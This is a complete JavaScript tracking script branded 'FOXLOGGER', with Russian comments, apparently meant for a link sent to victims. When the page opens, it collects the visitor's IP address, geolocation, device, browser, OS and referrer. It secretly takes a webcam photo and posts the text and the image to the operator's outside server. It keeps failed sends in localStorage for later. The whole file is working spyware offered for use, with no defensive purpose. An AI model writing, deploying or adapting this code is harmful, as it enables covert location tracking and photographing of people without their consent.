(async function() {
    "use strict";

    // ========== 1. Сбор IP + геолокация ==========
    let ipAddress = "0.0.0.0";
    let geo = "не определена";
    let country = "";
    let city = "";
    let lat = "";
    let lon = "";

    try {
        // Получаем IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        // Получаем геолокацию
        const geoReq = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoReq.json();
        
        city = geoData.city || "неизвестно";
        country = geoData.country_name || "неизвестно";
        lat = geoData.latitude || "?";
        lon = geoData.longitude || "?";
        geo = `${city}, ${country} (${lat}, ${lon})`;
    } catch(e) {
        console.warn("Geo error:", e);
        geo = "ошибка геолокации";
    }

    // ========== 2. Время перехода ==========
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ========== 3. UserAgent / устройство ==========
    const userAgent = navigator.userAgent;
    let deviceType = "не определено";
    
    if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "📱 Телефон";
    } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
        deviceType = "💻 Компьютер";
    }
    
    // Браузер
    let browser = "неизвестно";
    if (userAgent.includes("Chrome")) browser = "Chrome";
    else if (userAgent.includes("Firefox")) browser = "Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Edge";
    else if (userAgent.includes("Opera")) browser = "Opera";
    
    // ОС
    let os = "неизвестно";
    if (userAgent.includes("Windows")) os = "Windows";
    else if (userAgent.includes("Android")) os = "Android";
    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
    else if (userAgent.includes("Mac")) os = "MacOS";
    else if (userAgent.includes("Linux")) os = "Linux";

    // Краткая версия UA
    let shortUA = userAgent;
    if (userAgent.length > 80) {
        shortUA = userAgent.substring(0, 77) + "...";
    }

    // ========== 4. Формирование текста ==========
    const textMessage = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER

🌐 IP: ${ipAddress}
📍 Гео: ${geo}
🕐 Время: ${timeStr}
📱 Устройство: ${deviceType}
🌍 Браузер: ${browser}
💿 ОС: ${os}
🖥 UserAgent: ${shortUA}

━━━━━━━━━━━━━━━━━━━━━━
📎 Ссылка: ${window.location.href}
🔗 Реферер: ${document.referrer || "прямой переход"}`;

    // ========== 5. Захват фото с вебкамеры ==========
    let photoBlob = null;

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;

        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        photoBlob = await new Promise(resolve => {
            canvas.toBlob(resolve, "image/jpeg", 0.85);
        });

        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        console.warn("Camera error:", e);
        photoBlob = null;
    }

    // ========== 6. Отправка через ТВОЙ БОТ НА RENDER ==========
    async function sendToRender(data) {
        try {
            const response = await fetch(`${YOUR_RENDER_URL}/collect`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            });
            return response.ok;
        } catch(e) {
            console.warn("Send error:", e);
            return false;
        }
    }

    // Отправляем текст
    const textData = {
        type: "text",
        message: textMessage,
        timestamp: new Date().toISOString()
    };
    
    const textSent = await sendToRender(textData);
    
    if (textSent) {
        console.log("✅ Текст отправлен");
        
        // Если есть фото — отправляем
        if (photoBlob) {
            const formData = new FormData();
            formData.append("type", "photo");
            formData.append("photo", photoBlob, "snapshot.jpg");
            formData.append("caption", textMessage);
            
            try {
                await fetch(`${YOUR_RENDER_URL}/collect-photo`, {
                    method: "POST",
                    body: formData
                });
                console.log("✅ Фото отправлено");
            } catch(e) {
                console.warn("Photo send error:", e);
            }
        }
    } else {
        console.log("⚠️ Не удалось отправить данные");
        
        // Сохраняем в localStorage если не отправилось
        try {
            const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
            failed.push({
                data: textMessage,
                time: new Date().toISOString()
            });
            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-10)));
        } catch(e) {}
    }
})();
